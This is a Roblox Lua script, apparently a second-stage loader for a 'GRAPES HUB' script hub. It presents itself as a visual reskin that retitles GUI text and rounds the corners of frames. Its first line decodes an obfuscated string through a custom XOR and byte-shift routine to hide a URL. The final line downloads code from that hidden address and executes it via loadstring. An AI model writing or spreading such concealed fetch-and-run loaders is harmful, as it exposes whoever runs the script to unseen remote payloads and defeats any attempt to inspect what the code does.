
--[[ STAGE 2: VISUAL CORE ]]
local YV1kNsNHjcuxLFkxcA3K="\078\101\079\144\162\175\176\096\179\187\188\194\156\121\118\136\146\123\178\177\221\198\225\204\232\170\198\156\182\188\210\190\166\174\193\209\228\249\234\185\198\205\217\204\205\205\216\240\008\228\232\250\234\240\255\039\048\242\244\255\254\063\003\006\014\035\010\021\018\042\029\093\041\055\037\047\046\057\052\059\055\059\061\129\070\071\078\140\105\082\096\114\091\095\102\120\114\127\136\116\142\116\147\123\136\194\158\143\159\207\210\224\172\176\183\186\161"local QRcbGzLVJc1RGIYJodD=234 local _ebYT9LxGVNKGiTF5sT=166 local JIFg08M2W_b59aThi=0 local JKVyq8h7GvN9nc=3 local Kk5OiCqeW4yLQMtKrXC7x4=26 local q1dOrjFF2kpofWVRWwno=true local TsI9ejkc2c5Y4V8=bit32 and bit32.bxor if not TsI9ejkc2c5Y4V8 then TsI9ejkc2c5Y4V8=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local s4RBUKpBmdoDB6={}for FPBzwVY0M08Bet1Vj=1,#YV1kNsNHjcuxLFkxcA3K do local kyA8MTE3aWSgr3qRgjHt=string.byte(YV1kNsNHjcuxLFkxcA3K,FPBzwVY0M08Bet1Vj)local EsirVqLQgVkZwkhaf=(_ebYT9LxGVNKGiTF5sT+(FPBzwVY0M08Bet1Vj*JKVyq8h7GvN9nc)+Kk5OiCqeW4yLQMtKrXC7x4)%256 if JIFg08M2W_b59aThi==0 then kyA8MTE3aWSgr3qRgjHt=(kyA8MTE3aWSgr3qRgjHt-EsirVqLQgVkZwkhaf)%256 s4RBUKpBmdoDB6[FPBzwVY0M08Bet1Vj]=string.char(TsI9ejkc2c5Y4V8(kyA8MTE3aWSgr3qRgjHt,QRcbGzLVJc1RGIYJodD))else kyA8MTE3aWSgr3qRgjHt=TsI9ejkc2c5Y4V8(kyA8MTE3aWSgr3qRgjHt,QRcbGzLVJc1RGIYJodD)s4RBUKpBmdoDB6[FPBzwVY0M08Bet1Vj]=string.char((kyA8MTE3aWSgr3qRgjHt-EsirVqLQgVkZwkhaf)%256)end end local kI3yYUbaQVLdbEP5UY=table.concat(s4RBUKpBmdoDB6)if q1dOrjFF2kpofWVRWwno then kI3yYUbaQVLdbEP5UY=string.reverse(kI3yYUbaQVLdbEP5UY)end local Nt7nII9plRjRfkdUcipSy=kI3yYUbaQVLdbEP5UY
local HubName = "GRAPES HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Nt7nII9plRjRfkdUcipSy))()
